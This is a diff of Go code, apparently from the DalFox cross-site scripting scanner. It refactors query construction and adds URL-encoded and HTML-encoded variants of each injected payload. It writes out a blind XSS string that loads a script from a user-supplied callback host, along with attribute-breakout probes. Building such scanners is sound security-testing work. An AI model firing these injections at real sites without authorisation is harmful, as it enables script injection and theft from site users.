@@ -113,9 +113,7 @@ func Scan(target string, optionsStr map[string]string, optionsBool map[string]bo
 
 			arr := getCommonPayload()
 			for _, avv := range arr {
-				tq := optimization.MakePathQuery(target, avv)
-				tm := map[string]string{"param": "pleasedonthaveanamelikethis_plz_plz"}
-				tm["type"] = "inPATH"
+				tq, tm := optimization.MakePathQuery(target, "pleasedonthaveanamelikethis_plz_plz", avv, "inPATH")
 				tm["payload"] = ";" + avv
 				query[tq] = tm
 
@@ -138,11 +136,15 @@ func Scan(target string, optionsStr map[string]string, optionsBool map[string]bo
 							arr := getInJsPayload()
 							for _, avv := range arr {
 								if optimization.Optimization(avv, badchars) {
-									tq := optimization.MakeRequestQuery(target, k, avv)
-									tm := map[string]string{"param": k}
-									tm["type"] = "inJS"
-									tm["payload"] = avv
+									// Add plain XSS Query
+									tq, tm := optimization.MakeRequestQuery(target, k, avv, "inJS")
 									query[tq] = tm
+									// Add URL Encoded XSS Query
+									etq, etm := optimization.MakeURLEncodeRequestQuery(target, k, avv, "inJS")
+									query[etq] = etm
+									// Add HTML Encoded XSS Query
+									htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, k, avv, "inJS")
+									query[htq] = htm
 								}
 							}
 						}
@@ -150,11 +152,15 @@ func Scan(target string, optionsStr map[string]string, optionsBool map[string]bo
 							arr := getAttrPayload()
 							for _, avv := range arr {
 								if optimization.Optimization(avv, badchars) {
-									tq := optimization.MakeRequestQuery(target, k, avv)
-									tm := map[string]string{"param": k}
-									tm["type"] = "inATTR"
-									tm["payload"] = avv
+									// Add plain XSS Query
+									tq, tm := optimization.MakeRequestQuery(target, k, avv, "inATTR")
 									query[tq] = tm
+									// Add URL Encoded XSS Query
+									etq, etm := optimization.MakeURLEncodeRequestQuery(target, k, avv, "inATTR")
+									query[etq] = etm
+									// Add HTML Encoded XSS Query
+									htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, k, avv, "inATTR")
+									query[htq] = htm
 								}
 							}
 						}
@@ -177,11 +183,15 @@ func Scan(target string, optionsStr map[string]string, optionsBool map[string]bo
 							arc := getCommonPayload()
 							for _, avv := range arc {
 								if optimization.Optimization(avv, badchars) {
-									tq := optimization.MakeRequestQuery(target, k, avv)
-									tm := map[string]string{"param": k}
-									tm["type"] = "inHTML"
-									tm["payload"] = avv
+									// Add plain XSS Query
+									tq, tm := optimization.MakeRequestQuery(target, k, avv, "inHTML")
 									query[tq] = tm
+									// Add URL encoded XSS Query
+									etq, etm := optimization.MakeURLEncodeRequestQuery(target, k, avv, "inHTML")
+									query[etq] = etm
+									// Add HTML Encoded XSS Query
+									htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, k, avv, "inHTML")
+									query[htq] = htm
 								}
 							}
 						}
@@ -196,11 +206,18 @@ func Scan(target string, optionsStr map[string]string, optionsBool map[string]bo
 			spu, _ := url.Parse(target)
 			spd := spu.Query()
 			for spk := range spd {
-				tq := optimization.MakeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>")
-				tm := map[string]string{"param": spk}
-				tm["type"] = "toBlind"
+				// Add plain XSS Query
+				tq, tm := optimization.MakeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind")
 				tm["payload"] = "Blind"
 				query[tq] = tm
+				// Add URL encoded XSS Query
+				etq, etm := optimization.MakeURLEncodeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind")
+				etm["payload"] = "Blind"
+				query[etq] = etm
+				// Add HTML Encoded XSS Query
+				htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind")
+				htm["payload"] = "Blind"
+				query[htq] = htm
 			}
 			printing.DalLog("SYSTEM", "Added your blind XSS ("+optionsStr["blind"]+")")
 		}
@@ -215,11 +232,15 @@ func Scan(target string, optionsStr map[string]string, optionsBool map[string]bo
 					spu, _ := url.Parse(target)
 					spd := spu.Query()
 					for spk := range spd {
-						tq := optimization.MakeRequestQuery(target, spk, customPayload)
-						tm := map[string]string{"param": spk}
-						tm["type"] = "toHTML"
-						tm["payload"] = customPayload
+						// Add plain XSS Query
+						tq, tm := optimization.MakeRequestQuery(target, spk, customPayload, "toHTML")
 						query[tq] = tm
+						// Add URL encoded XSS Query
+						etq, etm := optimization.MakeURLEncodeRequestQuery(target, spk, customPayload, "inHTML")
+						query[etq] = etm
+						// Add HTML Encoded XSS Query
+						htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, spk, customPayload, "inHTML")
+						query[htq] = htm
 					}
 				}
 				printing.DalLog("SYSTEM", "Added your "+strconv.Itoa(len(ff))+" custom xss payload")
@@ -403,7 +424,7 @@ func ParameterAnalysis(target string, optionsStr map[string]string) map[string][
 					temp_q := tempURL.Query()
 					tempURL.RawQuery = temp_q.Encode()
 				*/
-				tempURL := optimization.MakeRequestQuery(target, k, "DalFox")
+				tempURL, _ := optimization.MakeRequestQuery(target, k, "DalFox", "PA")
 				var code string
 
 				//tempURL.RawQuery = temp_q.Encode()
@@ -431,22 +452,22 @@ func ParameterAnalysis(target string, optionsStr map[string]string) map[string][
 						smap = smap + "inJS[" + strconv.Itoa(ij) + "] "
 					}
 					ia := 0
-					tempURL := optimization.MakeRequestQuery(target, k, "\" id=dalfox \"")
+					tempURL, _ := optimization.MakeRequestQuery(target, k, "\" id=dalfox \"", "PA")
 					_, _, vds, _ := SendReq(tempURL, "", optionsStr)
 					if vds {
 						ia = ia + 1
 					}
-					tempURL = optimization.MakeRequestQuery(target, k, "' id=dalfox '")
+					tempURL, _ = optimization.MakeRequestQuery(target, k, "' id=dalfox '", "PA")
 					_, _, vds, _ = SendReq(tempURL, "", optionsStr)
 					if vds {
 						ia = ia + 1
 					}
-					tempURL = optimization.MakeRequestQuery(target, k, "' class=dalfox '")
+					tempURL, _ = optimization.MakeRequestQuery(target, k, "' class=dalfox '", "PA")
 					_, _, vds, _ = SendReq(tempURL, "", optionsStr)
 					if vds {
 						ia = ia + 1
 					}
-					tempURL = optimization.MakeRequestQuery(target, k, "\" class=dalfox \"")
+					tempURL, _ = optimization.MakeRequestQuery(target, k, "\" class=dalfox \"", "PA")
 					_, _, vds, _ = SendReq(tempURL, "", optionsStr)
 					if vds {
 						ia = ia + 1
@@ -477,7 +498,7 @@ func ParameterAnalysis(target string, optionsStr map[string]string) map[string][
 						*/
 						go func() {
 							defer wg.Done()
-							turl := optimization.MakeRequestQuery(target, k, "dalfox"+char)
+							turl, _ := optimization.MakeRequestQuery(target, k, "dalfox"+char, "PA")
 							_, _, _, vrs := SendReq(turl, "dalfox"+char, optionsStr)
 							_ = resp
 							if vrs {
